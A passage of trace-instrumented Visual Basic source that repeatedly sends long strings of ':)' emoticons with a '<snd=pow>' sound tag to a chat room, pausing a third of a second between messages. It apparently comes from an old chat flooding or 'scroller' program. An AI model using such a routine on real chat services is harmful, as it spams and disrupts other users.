194    ChatSend ("<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ ")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "195    pause 0.34"
' </VB WATCH>
195    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "196    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
196    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "197    pause 0.34"
' </VB WATCH>
197    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "198    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
198    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "199    pause 0.34"
' </VB WATCH>
199    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "200    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
200    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "201    pause 0.34"
' </VB WATCH>
201    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "202    chatsend (" & Chr(34) & "<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ " & Chr(34) & ")"
' </VB WATCH>
202    ChatSend ("<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ ")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "203    pause 0.34"
' </VB WATCH>
203    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "204    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
204    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "205    pause 0.34"
' </VB WATCH>
205    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "206    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
206    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "207    pause 0.34"
' </VB WATCH>
207    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "208    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
208    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "209    pause 0.34"
' </VB WATCH>
209    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "210    chatsend (" & Chr(34) & "<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ " & Chr(34) & ")"
' </VB WATCH>
210    ChatSend ("<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ ")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "211    pause 0.34"
' </VB WATCH>
211    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "212    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
212    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "213    pause 0.34"
' </VB WATCH>
213    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "214    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
214    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "215    pause 0.34"
' </VB WATCH>
215    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "216    chatsend (" & Chr(34) & "<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ " & Chr(34) & ")"
' </VB WATCH>
216    ChatSend ("<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ ")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "217    pause 0.34"
' </VB WATCH>
217    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "218    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
218    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "219    pause 0.34"
' </VB WATCH>
219    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "220    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
220    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "221    pause 0.34"
' </VB WATCH>
221    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "222    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
222    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "223    pause 0.34"
' </VB WATCH>
223    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "224    chatsend (" & Chr(34) & "<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ " & Chr(34) & ")"
' </VB WATCH>
224    ChatSend ("<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ ")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "225    pause 0.34"
' </VB WATCH>
225    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "226    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
226    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "227    pause 0.34"
' </VB WATCH>
227    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "228    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
228    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "229    pause 0.34"
' </VB WATCH>
229    Pause 0.34
' <VB WATCH>
